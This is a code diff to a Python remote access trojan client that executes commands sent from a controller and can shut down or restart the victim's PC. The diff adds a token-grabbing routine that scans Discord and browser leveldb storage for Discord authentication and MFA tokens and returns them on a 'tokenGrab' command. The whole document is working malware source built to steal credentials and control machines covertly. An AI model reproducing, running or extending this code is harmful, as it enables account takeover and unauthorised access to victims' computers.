@@ -1,4 +1,4 @@
-import socket, subprocess, time, json, os, base64, ctypes, os, sys
+import socket, subprocess, time, json, os, base64, ctypes, os, sys, re
 
 ctypes.windll.user32.MessageBoxW(
     0,
@@ -48,6 +48,47 @@ class RATConnector:
             command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
         )
 
+    def grabTokens(self):
+        def find_tokens(path):
+            path += "\\Local Storage\\leveldb"
+            tokens = []
+            for file_name in os.listdir(path):
+                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+                    continue
+                for line in [
+                    x.strip()
+                    for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
+                    if x.strip()
+                ]:
+                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                        for token in re.findall(regex, line):
+                            tokens.append(token)
+            return tokens
+
+        loc = os.getenv("LOCALAPPDATA")
+        rom = os.getenv("APPDATA")
+        paths = {
+            "Discord": rom + "\\Discord",
+            "Discord Canary": rom + "\\discordcanary",
+            "Discord PTB": rom + "\\discordptb",
+            "Google Chrome": loc + "\\Google\\Chrome\\User Data\\Default",
+            "Opera": rom + "\\Opera Software\\Opera Stable",
+            "Brave": loc + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+            "Yandex": loc + "\\Yandex\\YandexBrowser\\User Data\\Default",
+        }
+        message = ""
+        for platform, path in paths.items():
+            if not os.path.exists(path):
+                continue
+            message += f"\n{platform}\n\n"
+            tokens = find_tokens(path)
+            if len(tokens) > 0:
+                for token in tokens:
+                    message += f"{token}\n"
+            else:
+                message += "No tokens found.\n"
+            return message
+
     # Reading files with base 64 encryption for non UTF-8 compatability
     def readFile(self, path):
         with open(path, "rb") as file:
@@ -88,7 +129,8 @@ class RATConnector:
                     os.system("shutdown /s /t 1")
                 elif command[0] == "restart":
                     os.system("shutdown /r /t 1")
-                    commandResponse = "[+] Clients PC is restarting"
+                elif command[0] == "tokenGrab":
+                    commandResponse = self.grabTokens()
                 else:
                     convCommand = self.arrayToString(command)
                     commandResponse = self.runCommand(convCommand).decode()
